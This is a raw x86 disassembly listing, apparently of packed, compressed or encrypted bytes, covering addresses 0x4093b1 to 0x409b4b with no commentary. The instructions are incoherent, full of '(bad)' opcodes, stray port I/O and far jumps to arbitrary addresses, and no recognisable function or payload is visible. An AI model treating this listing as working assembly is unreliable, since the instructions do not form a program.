  4093b1:	fcmovnbe st,st(0)
  4093b3:	xchg   esi,eax
  4093b4:	and    al,0x6b
  4093b6:	pop    ss
  4093b7:	jns    0x40942b
  4093b9:	cmp    esi,DWORD PTR [edi]
  4093bb:	scas   eax,DWORD PTR es:[edi]
  4093bc:	adc    BYTE PTR [ebx],dh
  4093be:	aam    0x28
  4093c0:	jecxz  0x409402
  4093c2:	scas   al,BYTE PTR es:[edi]
  4093c3:	push   es
  4093c4:	xor    al,0xa8
  4093c6:	cmc    
  4093c7:	outs   dx,DWORD PTR ds:[esi]
  4093c8:	dec    ebp
  4093c9:	jecxz  0x409407
  4093cb:	xchg   esi,eax
  4093cc:	mov    bl,0x71
  4093ce:	test   al,0x75
  4093d0:	sub    BYTE PTR [edx+0x3d9a6775],bh
  4093d6:	jo     0x40941b
  4093d8:	jb     0x4093a5
  4093da:	adc    eax,DWORD PTR [ecx]
  4093dc:	ins    DWORD PTR es:[edi],dx
  4093dd:	shl    DWORD PTR [edi+0x2268f220],cl
  4093e3:	inc    edi
  4093e4:	sbb    al,0xd0
  4093e6:	push   cs
  4093e7:	test   al,0xcd
  4093e9:	pusha  
  4093ea:	mov    ds:0x9c172797,al
  4093ef:	loopne 0x4093d2
  4093f1:	ret    0xd767
  4093f4:	mov    al,ds:0x53bf0c78
  4093f9:	(bad)  
  4093fa:	cwde   
  4093fb:	add    BYTE PTR [eax+0x56],cl
  4093fe:	lods   al,BYTE PTR ds:[esi]
  4093ff:	arpl   di,di
  409401:	test   cl,0x56
  409404:	and    eax,0x8fc83195
  409409:	or     ebx,DWORD PTR [edx+0x67]
  40940c:	pop    ds
  40940d:	int    0x36
  40940f:	inc    esi
  409410:	push   ss
  409411:	fwait
  409412:	cmp    eax,0x53a79921
  409417:	jl     0x4093a1
  409419:	xor    ecx,DWORD PTR [eax+0x21]
  40941c:	mov    edi,0xb041a12b
  409421:	adc    al,0x9
  409423:	hlt    
  409424:	adc    edi,DWORD PTR [ebp-0x67e42b97]
  40942a:	dec    DWORD PTR [esi+0x0]
  40942d:	jg     0x409478
  40942f:	dec    ecx
  409430:	push   0xffffff87
  409432:	retf   0x2b91
  409435:	add    ch,BYTE PTR [edi+0x45]
  409438:	imul   edx,DWORD PTR [ebx+0x24],0x7aeca585
  40943f:	popf   
  409440:	call   0x9181:0x1aa90b47
  409447:	ret    0x4fac
  40944a:	cs mov ah,0xec
  40944d:	repz and BYTE PTR [ecx*1+0x2e2d89ee],al
  409455:	dec    ebx
  409456:	retf   0x47bc
  409459:	aas    
  40945a:	mov    bh,0x37
  40945c:	sbb    al,BYTE PTR [edx+0x5b7a762c]
  409462:	lds    edi,FWORD PTR [ebp+0x5f]
  409465:	jno    0x409454
  409467:	bound  edi,QWORD PTR [ebx-0x7e]
  40946a:	ja     0x4093f8
  40946c:	mov    esi,0xfa18a230
  409471:	jae    0x40943c
  409473:	retf   0xd12c
  409476:	and    al,0xac
  409478:	mov    esi,0xffee0761
  40947d:	lea    ecx,[edx]
  40947f:	dec    esi
  409480:	and    edx,DWORD PTR [ecx-0x14b74095]
  409486:	fcomp  QWORD PTR [edi+0x5]
  409489:	rol    DWORD PTR [esi+0x76bbb32a],cl
  40948f:	push   eax
  409490:	jmp    0x9b187e2f
  409495:	mov    edx,0xf1534fe4
  40949a:	repz scas eax,DWORD PTR es:[edi]
  40949c:	lahf   
  40949d:	in     eax,0x6a
  40949f:	dec    edx
  4094a0:	rcr    BYTE PTR [edi+0x2d],1
  4094a3:	fcmovnu st,st(3)
  4094a5:	imul   ebp,DWORD PTR ds:0x7dca6056,0x2375caab
  4094af:	lods   eax,DWORD PTR ds:[esi]
  4094b0:	loop   0x409439
  4094b2:	retf   0xafc4
  4094b5:	jl     0x409520
  4094b7:	fsubr  QWORD PTR [eax+0x1ce8544]
  4094bd:	(bad)  
  4094be:	mov    al,0x65
  4094c0:	mov    bl,bh
  4094c2:	bound  eax,QWORD PTR [edi]
  4094c4:	push   ss
  4094c5:	jo     0x409467
  4094c7:	and    DWORD PTR [edi],ebx
  4094c9:	xchg   ebx,eax
  4094ca:	pop    eax
  4094cb:	add    ecx,esp
  4094cd:	(bad)  
  4094ce:	std    
  4094cf:	dec    ebp
  4094d0:	or     al,0xd9
  4094d2:	jns    0x40949e
  4094d4:	js     0x40953b
  4094d6:	mov    ds,WORD PTR [edi+eiz*2]
  4094d9:	in     al,dx
  4094da:	ret    0x6068
  4094dd:	out    0x5e,al
  4094df:	push   ebp
  4094e0:	out    0x53,eax
  4094e2:	pop    eax
  4094e3:	out    dx,eax
  4094e4:	pop    edx
  4094e5:	xor    edi,edi
  4094e7:	cmp    ebp,DWORD PTR [ebp-0x77]
  4094ea:	int    0x89
  4094ec:	xchg   esi,eax
  4094ed:	jmp    0x4094fd
  4094ef:	cli    
  4094f0:	dec    esp
  4094f1:	sar    BYTE PTR [ebp-0x729955bf],1
  4094f7:	mov    ebp,edi
  4094f9:	jnp    0x4094b1
  4094fb:	lock or DWORD PTR [ebx],eax
  4094fe:	adc    BYTE PTR ds:0x30fcad8c,dh
  409504:	adc    eax,0xa713f23c
  409509:	push   eax
  40950a:	iret   
  40950b:	xor    DWORD PTR [ebp+0x1897d669],0xffffff9c
  409512:	fadd   st(1),st
  409514:	mov    bl,0x1f
  409516:	pop    es
  409517:	cld    
  409518:	pop    esp
  409519:	lods   eax,DWORD PTR ds:[esi]
  40951a:	gs mov al,0xca
  40951d:	adc    al,0x1f
  40951f:	repnz fdiv st,st(6)
  409522:	push   ecx
  409523:	mov    ecx,0xb865250c
  409528:	inc    esi
  409529:	ds push ecx
  40952b:	xor    DWORD PTR [eax],esp
  40952d:	xor    al,0x26
  40952f:	jns    0x409561
  409531:	fstp   QWORD PTR [ebx]
  409533:	fnclex 
  409535:	pop    ss
  409536:	dec    edx
  409537:	imul   edx,DWORD PTR [ebx],0x730be115
  40953d:	ins    BYTE PTR es:[edi],dx
  40953e:	pop    ss
  40953f:	push   0xfeb1781a
  409544:	dec    esp
  409545:	xor    al,BYTE PTR [ebx+0x4b]
  409548:	stos   DWORD PTR es:[edi],eax
  409549:	and    dl,ah
  40954b:	test   DWORD PTR [eax+0x38da0fdf],edi
  409551:	xor    cl,bh
  409553:	inc    ebx
  409554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409555:	dec    edx
  409556:	add    al,al
  409558:	repz jmp 0x22c5:0xa445372b
  409560:	pop    es
  409561:	popa   
  409562:	adc    ah,BYTE PTR [ebp+0x4a]
  409565:	jmp    0x44b8:0x2a54ffd6
  40956c:	test   ah,ch
  40956e:	and    bl,cl
  409570:	push   edx
  409571:	sbb    eax,0x17559622
  409576:	xchg   ecx,eax
  409577:	cmp    DWORD PTR [edx],0xe699df74
  40957d:	inc    eax
  40957e:	jbe    0x409596
  409580:	cmc    
  409581:	fsub   DWORD PTR [ebx+0xa1c7c49]
  409587:	test   DWORD PTR [ebx+eiz*4],esi
  40958a:	jecxz  0x409546
  40958c:	jae    0x409552
  40958e:	jns    0x4095f6
  409590:	mov    esi,0xa633b495
  409595:	xchg   ebp,eax
  409596:	jle    0x40951e
  409598:	cmp    ah,ah
  40959a:	ins    DWORD PTR es:[edi],dx
  40959b:	into   
  40959c:	or     ecx,edi
  40959e:	shl    BYTE PTR [edi+0xa],0xf7
  4095a2:	lock or eax,DWORD PTR [edx+edx*8-0x16]
  4095a7:	(bad)  
  4095a8:	out    0xa4,al
  4095aa:	mov    ch,BYTE PTR [edi-0x2e]
  4095ad:	ins    BYTE PTR es:[edi],dx
  4095ae:	popf   
  4095af:	cwde   
  4095b0:	cld    
  4095b1:	push   ss
  4095b2:	lahf   
  4095b3:	lods   al,BYTE PTR ds:[si]
  4095b5:	je     0x409610
  4095b7:	cmc    
  4095b8:	mov    al,0xcb
  4095ba:	xchg   ebx,eax
  4095bb:	call   0xaccda520
  4095c0:	mov    bh,0xb7
  4095c2:	ret    0x418d
  4095c5:	stos   DWORD PTR es:[edi],eax
  4095c6:	fisub  WORD PTR [edi-0x67581608]
  4095cc:	jnp    0x409558
  4095ce:	adc    bl,dh
  4095d0:	test   BYTE PTR [esi+0x30],cl
  4095d3:	mov    al,cl
  4095d5:	and    al,0x1a
  4095d7:	mov    ah,0xc5
  4095d9:	jp     0x4095d8
  4095db:	jecxz  0x40962b
  4095dd:	push   es
  4095de:	inc    esi
  4095df:	add    BYTE PTR [ecx],ah
  4095e1:	(bad)  
  4095e2:	sub    eax,DWORD PTR [ebp-0x7e]
  4095e5:	fsub   QWORD PTR [eax-0x28]
  4095e8:	mov    DWORD PTR ss:[ebx-0x7090f096],esi
  4095ef:	xor    al,0xbf
  4095f1:	and    ecx,DWORD PTR [edi+edi*8]
  4095f4:	out    dx,eax
  4095f5:	push   0xffffffff
  4095f7:	push   ebx
  4095f8:	adc    al,0x63
  4095fa:	mov    dh,0x11
  4095fc:	out    0x74,al
  4095fe:	xor    edi,ebp
  409600:	les    ebp,FWORD PTR [ecx+0x2a]
  409603:	cmp    BYTE PTR [edi+0x2d],ah
  409606:	test   cl,bh
  409608:	jbe    0x409688
  40960a:	dec    DWORD PTR [eax-0x12]
  40960d:	mov    ebp,0xb95df18d
  409612:	mov    ebx,DWORD PTR [edi+0x6]
  409615:	pop    edx
  409616:	cmc    
  409617:	push   edi
  409618:	stos   BYTE PTR es:[edi],al
  409619:	jne    0x409641
  40961b:	jne    0x40963a
  40961d:	mov    ds,WORD PTR [ebx+0x4d9f56f5]
  409623:	ret    0x175c
  409626:	dec    esp
  409627:	mov    ds:0x480c9f34,eax
  40962c:	rcl    DWORD PTR [esi-0x44],0xbf
  409630:	imul   ebx,DWORD PTR [ebx],0x6f
  409633:	or     eax,0x8773ee2a
  409638:	(bad)  [eax+esi*1+0xb]
  40963c:	pop    es
  40963d:	add    BYTE PTR [ebp+edx*2+0x77f768e0],0xf4
  409645:	retf   0xcb1b
  409648:	add    ch,BYTE PTR [ebp+0x10]
  40964b:	sub    bh,BYTE PTR [edx+0x62b42102]
  409651:	es mov eax,0x9955cbc8
  409657:	mov    bh,bl
  409659:	mov    ds:0x19e8e539,eax
  40965e:	pop    ds
  40965f:	cmp    BYTE PTR [ebp+0x6ed50b71],cl
  409665:	adc    eax,0x4a306b8b
  40966a:	cmp    ebp,DWORD PTR [ecx]
  40966c:	dec    ebp
  40966d:	pop    ss
  40966e:	mov    ecx,0x52ede363
  409673:	ret    
  409674:	repnz inc ebp
  409676:	adc    eax,0xe6eb2b9d
  40967b:	in     eax,dx
  40967c:	cmc    
  40967d:	and    eax,ebp
  40967f:	pop    ss
  409680:	sahf   
  409681:	pop    edx
  409682:	(bad)  
  409683:	adc    bh,ch
  409685:	nop
  409686:	xchg   esi,eax
  409687:	sbb    eax,DWORD PTR [ecx]
  409689:	xlat   BYTE PTR ds:[ebx]
  40968a:	and    al,0x5c
  40968c:	cmp    esi,ebp
  40968e:	push   esi
  40968f:	lods   al,BYTE PTR ds:[esi]
  409690:	mov    ch,0x3
  409692:	push   0xd4cf5a53
  409697:	and    esi,edi
  409699:	imul   esp,edx,0x5e
  40969c:	outs   dx,BYTE PTR ds:[esi]
  40969d:	and    cl,0x43
  4096a0:	cdq    
  4096a1:	jbe    0x4096cb
  4096a3:	ins    DWORD PTR es:[edi],dx
  4096a4:	mov    ah,0xb5
  4096a6:	aaa    
  4096a7:	out    0x79,eax
  4096a9:	pop    edx
  4096aa:	or     cl,dh
  4096ac:	jo     0x4096fb
  4096ae:	ret    
  4096af:	repz icebp 
  4096b1:	jo     0x409704
  4096b3:	dec    edx
  4096b4:	mov    edi,0x9758e517
  4096b9:	dec    ebx
  4096ba:	cmp    BYTE PTR ds:0xccd0e386,dh
  4096c0:	dec    edi
  4096c1:	add    al,0x99
  4096c3:	and    bh,BYTE PTR ds:0xd264b543
  4096c9:	xchg   edx,eax
  4096ca:	jne    0x409728
  4096cc:	fbstp  TBYTE PTR [edx-0x4c]
  4096cf:	not    DWORD PTR [edi+0x2d]
  4096d2:	(bad)  
  4096d3:	bound  ebx,QWORD PTR [ebx]
  4096d5:	retf   0xf82e
  4096d8:	mov    ebp,0x480c3982
  4096dd:	jns    0x40967e
  4096df:	push   edi
  4096e0:	lea    ebx,[ecx+0x5eedb3e4]
  4096e6:	dec    esp
  4096e7:	loop   0x409741
  4096e9:	sbb    al,0x1d
  4096eb:	pop    ss
  4096ec:	cmp    eax,0x8f60d418
  4096f1:	lods   eax,DWORD PTR ds:[esi]
  4096f2:	sbb    BYTE PTR [ebp+0x73efdc5b],cl
  4096f8:	push   esp
  4096f9:	xor    DWORD PTR [esi],esp
  4096fb:	fwait
  4096fc:	inc    edx
  4096fd:	lods   al,BYTE PTR ds:[esi]
  4096fe:	das    
  4096ff:	push   ecx
  409700:	mov    ss,WORD PTR [ebx-0x12b2ac38]
  409706:	js     0x4096aa
  409708:	into   
  409709:	lods   al,BYTE PTR ds:[esi]
  40970a:	jecxz  0x409715
  40970c:	and    esi,DWORD PTR [ebx]
  40970e:	gs pusha 
  409710:	shl    DWORD PTR [ecx-0x4b],0xa3
  409714:	inc    edi
  409715:	jmp    0xb87ca2c0
  40971a:	sub    BYTE PTR [ebx+0x7e91defd],0x71
  409721:	sti    
  409722:	ja     0x409771
  409724:	test   al,0x5c
  409726:	mov    ah,BYTE PTR [ebp-0x55]
  409729:	inc    esi
  40972a:	xor    bh,dh
  40972c:	and    BYTE PTR [edx-0x3f],al
  40972f:	hlt    
  409730:	cwde   
  409731:	popf   
  409732:	inc    dl
  409734:	add    al,0x56
  409736:	fstp   QWORD PTR [edx]
  409738:	std    
  409739:	call   0x5b0b51b8
  40973e:	mov    esi,0x3d6c4d91
  409743:	dec    eax
  409744:	xor    eax,0x90f352b0
  409749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40974a:	mov    esp,0xe5bf9779
  40974f:	lds    esp,FWORD PTR [ecx-0x3c36885b]
  409755:	dec    ecx
  409756:	ins    DWORD PTR es:[edi],dx
  409757:	mov    ebx,0xb8c3364e
  40975c:	out    0x1,al
  40975e:	jl     0x4096f4
  409760:	inc    esp
  409761:	(bad)  [edx]
  409763:	(bad)  
  409764:	mov    bh,0xc3
  409766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409767:	and    eax,0x5f091337
  40976c:	ja     0x40970d
  40976e:	stos   DWORD PTR es:[edi],eax
  40976f:	ins    BYTE PTR es:[edi],dx
  409770:	aad    0xd3
  409772:	loopne 0x4097f2
  409774:	xor    ecx,DWORD PTR [esi-0x92161e0]
  40977a:	add    al,0x95
  40977c:	in     al,dx
  40977d:	in     eax,0x2d
  40977f:	daa    
  409780:	sbb    DWORD PTR [eax+0x5ce7d950],ecx
  409786:	lds    ebp,FWORD PTR [eax+esi*2-0x54]
  40978a:	mov    BYTE PTR [eax-0x50],ah
  40978d:	fsub   QWORD PTR [esi-0x16]
  409790:	sub    bh,al
  409792:	mov    edi,ebp
  409794:	inc    si
  409796:	add    esp,DWORD PTR [ebp+0x2f]
  409799:	pusha  
  40979a:	sub    BYTE PTR [edi-0x20],ch
  40979d:	sub    al,0x27
  40979f:	mov    gs,WORD PTR [edx+0x79]
  4097a2:	enter  0x9d08,0xce
  4097a6:	stos   BYTE PTR es:[edi],al
  4097a7:	push   es
  4097a8:	out    dx,al
  4097a9:	jg     0x409797
  4097ab:	mov    al,0x3c
  4097ad:	and    al,0x5c
  4097af:	xchg   ecx,eax
  4097b0:	or     DWORD PTR [edx],eax
  4097b2:	test   DWORD PTR [edx+0x50d1e475],0x4de1cab9
  4097bc:	mov    ebp,0x3816f78e
  4097c1:	and    al,0x5a
  4097c3:	jl     0x409752
  4097c5:	je     0x409828
  4097c7:	push   0xa241340e
  4097cc:	add    DWORD PTR [esi],ebp
  4097ce:	out    0x1a,eax
  4097d0:	(bad)  
  4097d1:	cmp    eax,0xc36a395
  4097d6:	sti    
  4097d7:	push   edi
  4097d8:	daa    
  4097d9:	scas   eax,DWORD PTR es:[edi]
  4097da:	or     DWORD PTR [edx+0x2c1d39b4],ebp
  4097e0:	inc    cl
  4097e2:	add    DWORD PTR [edi+0x2dbdd441],edx
  4097e8:	jecxz  0x40976b
  4097ea:	mov    ds:0x2175f68f,al
  4097ef:	lods   al,BYTE PTR ds:[esi]
  4097f0:	jecxz  0x409850
  4097f2:	mov    fs,WORD PTR [ecx]
  4097f4:	push   cs
  4097f5:	mov    ah,0xee
  4097f7:	sbb    eax,edx
  4097f9:	xchg   esi,eax
  4097fa:	cmp    bh,ah
  4097fc:	xor    BYTE PTR [eax-0x2ebbb066],0x76
  409803:	std    
  409804:	push   ss
  409805:	add    ebp,ecx
  409807:	ret    
  409808:	hlt    
  409809:	xchg   esp,eax
  40980a:	es (bad) 
  40980c:	jne    0x409886
  40980e:	lods   al,BYTE PTR ds:[esi]
  40980f:	inc    ecx
  409810:	adc    eax,0xf569a7b4
  409815:	and    DWORD PTR [eax],0x12
  409818:	retf   0x96d9
  40981b:	push   0x5bcdb264
  409820:	fst    DWORD PTR [ebx+ebp*4]
  409823:	jp     0x409852
  409825:	data16 mov ah,0x53
  409828:	mov    al,ds:0x3c78090c
  40982d:	xor    esp,eax
  40982f:	scas   al,BYTE PTR es:[edi]
  409830:	sub    BYTE PTR [ebp+0x2482a78d],dh
  409836:	cmp    al,bh
  409838:	or     edx,edx
  40983a:	mov    esi,0x6f42327e
  40983f:	popf   
  409840:	rcl    DWORD PTR [edx],cl
  409842:	repnz sbb DWORD PTR ds:0x413ce11a,esp
  409849:	int    0x79
  40984b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40984c:	pop    esp
  40984d:	xchg   DWORD PTR [edi-0x30],ebp
  409850:	add    al,0x7c
  409852:	sbb    al,0xd7
  409854:	std    
  409855:	lods   eax,DWORD PTR ds:[esi]
  409856:	push   ebx
  409857:	call   0x30d2:0xaa1a5488
  40985e:	mov    ebp,DWORD PTR [edi+ebx*1]
  409861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409862:	out    0x1b,eax
  409864:	pop    eax
  409865:	(bad)  
  409866:	mov    al,0xec
  409868:	lea    ebx,[edx-0x27]
  40986b:	in     eax,dx
  40986c:	out    dx,al
  40986d:	test   al,0xd4
  40986f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409870:	test   dl,bl
  409872:	mov    cl,0xfe
  409874:	dec    ebx
  409875:	push   cs
  409876:	retf   
  409877:	sbb    DWORD PTR [ecx+ecx*2],ecx
  40987a:	scas   al,BYTE PTR es:[edi]
  40987b:	add    eax,0x932b0fd9
  409880:	test   al,0x9f
  409882:	or     al,0x12
  409884:	ins    DWORD PTR es:[edi],dx
  409885:	sbb    BYTE PTR ds:0x29c2e53d,al
  40988b:	test   al,0xc5
  40988d:	push   esi
  40988e:	fnop   
  409890:	jg     0x4098ee
  409892:	fiadd  DWORD PTR [edi+esi*4]
  409895:	xchg   esp,eax
  409896:	scas   al,BYTE PTR es:[edi]
  409897:	in     al,0x61
  409899:	ss push 0x31
  40989c:	xor    DWORD PTR ds:0xc6eee3,edx
  4098a2:	dec    ebp
  4098a3:	push   esi
  4098a4:	stos   BYTE PTR es:[edi],al
  4098a5:	and    BYTE PTR [edi],ch
  4098a7:	pop    DWORD PTR [ecx-0x17]
  4098aa:	test   al,0x19
  4098ac:	loope  0x409882
  4098ae:	mov    cl,0xf
  4098b0:	add    dh,BYTE PTR ds:0x3dc2719a
  4098b6:	sub    DWORD PTR [edi+0x611e7239],edx
  4098bc:	push   0x48009f25
  4098c1:	push   edx
  4098c2:	sti    
  4098c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c4:	mov    ecx,0xa0cbee08
  4098c9:	or     al,0x74
  4098cb:	loopne 0x409946
  4098cd:	loopne 0x4098c5
  4098cf:	xor    BYTE PTR [eax+0x5b],dh
  4098d2:	ds or  dl,ch
  4098d5:	iret   
  4098d6:	test   al,0x56
  4098d8:	sub    cl,BYTE PTR ds:0x35747c10
  4098de:	jnp    0x4098b2
  4098e0:	inc    edi
  4098e1:	cmp    ecx,DWORD PTR [eax-0x1267927a]
  4098e7:	or     al,0x7
  4098e9:	dec    edi
  4098ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098eb:	adc    al,0xf3
  4098ed:	shr    esi,1
  4098ef:	sahf   
  4098f0:	je     0x409954
  4098f2:	(bad)  
  4098f3:	gs dec ecx
  4098f5:	in     al,0x58
  4098f7:	mov    ah,0x82
  4098f9:	inc    edi
  4098fa:	retf   0x2e50
  4098fd:	js     0x40996a
  4098ff:	(bad)  
  409900:	leave  
  409901:	mov    bh,0x61
  409903:	push   ebx
  409904:	sahf   
  409905:	adc    ah,BYTE PTR [edi-0x5]
  409908:	popa   
  409909:	retf   
  40990a:	xchg   esp,eax
  40990b:	and    DWORD PTR [ebx-0x4463058],ebp
  409911:	int    0x92
  409913:	cmp    DWORD PTR [edi-0x57],eax
  409916:	cmp    BYTE PTR fs:[esi+0x39c1df5d],bh
  40991d:	(bad)
  409920:	(bad)  
  409921:	and    eax,esi
  409923:	pop    ebp
  409924:	push   es
  409925:	fist   WORD PTR [eax-0x4d5a2d27]
  40992b:	and    ebp,eax
  40992d:	jae    0x409959
  40992f:	mov    al,0x8a
  409931:	fptan  
  409933:	inc    esp
  409934:	add    ecx,edi
  409936:	test   DWORD PTR [esi+0x49],edx
  409939:	mov    edi,0xd06c1852
  40993e:	push   edx
  40993f:	xor    ebx,eax
  409941:	imul   edi,DWORD PTR [ebx],0x70
  409944:	enter  0xa27b,0x9b
  409948:	mov    esi,esi
  40994a:	or     al,0xb7
  40994c:	into   
  40994d:	jae    0x40998d
  40994f:	std    
  409950:	sub    BYTE PTR [ebx],ah
  409952:	shl    ebp,1
  409954:	bound  esi,QWORD PTR es:[ecx+ebx*8+0x70]
  409959:	xchg   edx,eax
  40995a:	loop   0x4099c8
  40995c:	pop    ebx
  40995d:	add    DWORD PTR [ebp+esi*2+0x5378ff75],esp
  409964:	inc    edx
  409965:	push   ebx
  409966:	mov    edx,0x58463386
  40996b:	(bad)  
  40996c:	arpl   WORD PTR [esi+0x41],sp
  40996f:	mov    esp,0xcdd54a2f
  409974:	out    dx,al
  409975:	jns    0x409956
  409977:	lahf   
  409978:	or     edi,DWORD PTR [ecx-0x261858f4]
  40997e:	shl    DWORD PTR [edi],1
  409980:	ja     0x409956
  409982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409983:	or     al,0x1c
  409985:	push   esp
  409986:	(bad)  
  409987:	mov    bl,0xbc
  409989:	in     eax,dx
  40998a:	or     ecx,DWORD PTR [ebx+0x3e89b8a7]
  409990:	pop    esp
  409991:	pop    ebp
  409992:	jp     0x40994a
  409994:	imul   DWORD PTR [esi-0x6a]
  409997:	adc    BYTE PTR [edx+0x45],bh
  40999a:	daa    
  40999b:	xchg   BYTE PTR [eax+0x21],ah
  40999e:	jl     0x409a1c
  4099a0:	mov    eax,0x8b3343eb
  4099a5:	test   eax,0xfde4bbc4
  4099aa:	mov    esp,0x15aacebf
  4099af:	mov    cs,eax
  4099b1:	aas    
  4099b2:	dec    edi
  4099b3:	retf   0xa5ca
  4099b6:	sub    ebp,edx
  4099b8:	shl    DWORD PTR [ecx+esi*2+0x7ad4696d],cl
  4099bf:	mov    ds:0xe244dc0,eax
  4099c4:	cld    
  4099c5:	mov    ah,0xd7
  4099c7:	rcl    dl,cl
  4099c9:	lahf   
  4099ca:	sbb    eax,0x99fb6522
  4099cf:	fdiv   DWORD PTR [esi-0x39]
  4099d2:	xor    BYTE PTR [edi-0x373769ec],dh
  4099d8:	sbb    BYTE PTR [eax-0x51],0xf9
  4099dc:	lods   eax,DWORD PTR ds:[esi]
  4099dd:	xchg   esi,eax
  4099de:	add    BYTE PTR [ecx],bh
  4099e0:	pop    edi
  4099e1:	pop    esi
  4099e2:	out    0x7b,al
  4099e4:	pop    ss
  4099e5:	rol    DWORD PTR [ecx-0x69ac9ab3],cl
  4099eb:	mov    bh,0xdf
  4099ed:	push   edi
  4099ee:	push   esp
  4099ef:	ret    0x8bc2
  4099f2:	jo     0x409a1f
  4099f4:	ror    DWORD PTR [eax],1
  4099f6:	xchg   edi,eax
  4099f7:	int    0xe2
  4099f9:	sbb    BYTE PTR [edx],bl
  4099fb:	cmp    DWORD PTR [esi+0x3f],ebx
  4099fe:	dec    edx
  4099ff:	(bad)  
  409a00:	jmp    FWORD PTR [esi]
  409a02:	aas    
  409a03:	das    
  409a04:	cld    
  409a05:	pop    eax
  409a06:	push   ecx
  409a07:	sub    al,0x48
  409a09:	sar    DWORD PTR [esi+0x485c560c],0xc6
  409a10:	push   esi
  409a11:	mov    fs,WORD PTR [eax+0x66]
  409a14:	retf   
  409a15:	dec    edx
  409a16:	xchg   edx,eax
  409a17:	hlt    
  409a18:	fidiv  WORD PTR [eax+0x6c]
  409a1b:	or     BYTE PTR [ebp-0x6ffff05d],bh
  409a21:	jmp    0x409a84
  409a23:	adc    DWORD PTR [esi+0x77f4ee09],ebx
  409a29:	push   ebp
  409a2a:	mov    ebx,DWORD PTR [eax+0x3e12d4a7]
  409a30:	add    cl,BYTE PTR [edi+edi*1+0x31f631ae]
  409a37:	jmp    0x409a61
  409a39:	xchg   ebp,eax
  409a3a:	dec    eax
  409a3b:	xchg   edx,ecx
  409a3d:	loopne 0x409a15
  409a3f:	pusha  
  409a40:	xor    eax,0xd622e366
  409a45:	xor    DWORD PTR [esi+0x73232256],ebx
  409a4b:	inc    edx
  409a4c:	xor    bl,BYTE PTR [esi]
  409a4e:	xor    al,BYTE PTR [edx+0x47ada6ba]
  409a54:	fwait
  409a55:	push   0x619d64a7
  409a5a:	cmp    BYTE PTR ds:0x29e6b9d2,bl
  409a60:	mov    cl,0x13
  409a62:	test   BYTE PTR [eax-0x7ec87a31],0x4b
  409a69:	stos   DWORD PTR es:[edi],eax
  409a6a:	lock inc esp
  409a6c:	fwait
  409a6d:	push   0x33
  409a6f:	popa   
  409a70:	div    DWORD PTR [eax+0x52a2ac90]
  409a76:	jo     0x409aa3
  409a78:	fisub  DWORD PTR [edx+esi*1+0x17]
  409a7c:	ins    DWORD PTR es:[edi],dx
  409a7d:	push   edi
  409a7e:	ds fwait
  409a80:	std    
  409a81:	xchg   edi,eax
  409a82:	sub    dh,BYTE PTR [ecx+0x57]
  409a85:	test   al,0xcc
  409a87:	aas    
  409a88:	xchg   ecx,eax
  409a89:	cmp    esp,DWORD PTR [edi]
  409a8b:	inc    ebx
  409a8c:	cmp    eax,DWORD PTR [edx+0x225c057f]
  409a92:	jp     0x409a82
  409a94:	dec    esi
  409a95:	push   ebp
  409a96:	and    ebx,ecx
  409a98:	push   cs
  409a99:	or     eax,0x7b461a1e
  409a9e:	scas   al,BYTE PTR es:[edi]
  409a9f:	or     bh,BYTE PTR [esi-0x41b31a1c]
  409aa5:	inc    ebx
  409aa6:	out    0x34,eax
  409aa8:	ja     0x409af3
  409aaa:	inc    esi
  409aab:	mov    ah,0x15
  409aad:	add    eax,0xa3f556b
  409ab2:	ds or  DWORD PTR fs:[ebx],edi
  409ab6:	scas   eax,DWORD PTR es:[edi]
  409ab7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ab9:	dec    eax
  409aba:	aad    0xa7
  409abc:	iret   
  409abd:	les    edi,FWORD PTR [eax]
  409abf:	sbb    al,0xae
  409ac1:	and    bl,BYTE PTR [edx-0x28]
  409ac4:	mov    eax,0xc19b1156
  409ac9:	popa   
  409aca:	push   ebp
  409acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409acc:	or     esp,DWORD PTR [edx+0x132c0f73]
  409ad2:	mov    bl,0xc3
  409ad4:	sbb    BYTE PTR [ebp+0x15361283],ah
  409ada:	cwde   
  409adb:	jecxz  0x409b36
  409add:	retf   0x5aaf
  409ae0:	xor    eax,DWORD PTR ss:[ecx]
  409ae3:	jmp    0x50b16fd3
  409ae8:	xor    esp,DWORD PTR [ecx+ebx*4]
  409aeb:	in     al,0x5b
  409aed:	fistp  DWORD PTR [edx+0x33]
  409af0:	not    DWORD PTR [ecx-0x5d]
  409af3:	cmp    al,0xa3
  409af5:	inc    edi
  409af6:	pop    edi
  409af7:	loop   0x409abd
  409af9:	jp     0x409a9b
  409afb:	jp     0x409ac4
  409afd:	int    0x3f
  409aff:	sub    ecx,DWORD PTR [ebx]
  409b01:	fs in  eax,dx
  409b03:	sbb    dh,dh
  409b05:	(bad)  
  409b06:	push   esi
  409b07:	(bad)  
  409b08:	xchg   esi,eax
  409b09:	ins    BYTE PTR es:[edi],dx
  409b0a:	dec    esi
  409b0b:	fiadd  WORD PTR [eax]
  409b0d:	jp     0x409ab5
  409b0f:	add    BYTE PTR [esi+0x1384ab84],dl
  409b15:	push   0xffffffeb
  409b17:	mov    fs,ebp
  409b19:	mov    bh,0x5a
  409b1b:	dec    esp
  409b1c:	fisttp QWORD PTR [edx+0x6c]
  409b1f:	mov    ss,WORD PTR [eax-0x5e]
  409b22:	jecxz  0x409aae
  409b24:	dec    eax
  409b25:	test   DWORD PTR [edx],edi
  409b27:	push   eax
  409b28:	fs mov ecx,0x7cedaf6a
  409b2e:	dec    ebp
  409b2f:	xchg   edi,eax
  409b30:	jbe    0x409b31
  409b32:	sahf   
  409b33:	leave  
  409b34:	mov    ds:0x23120352,eax
  409b39:	out    dx,eax
  409b3a:	scas   al,BYTE PTR es:[edi]
  409b3b:	fidivr WORD PTR [edx-0x6bf98962]
  409b41:	xor    bl,BYTE PTR [ebp+0x214b52b3]
  409b47:	lahf   
  409b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b49:	mov    dh,0xe5
  409b4b:	nop
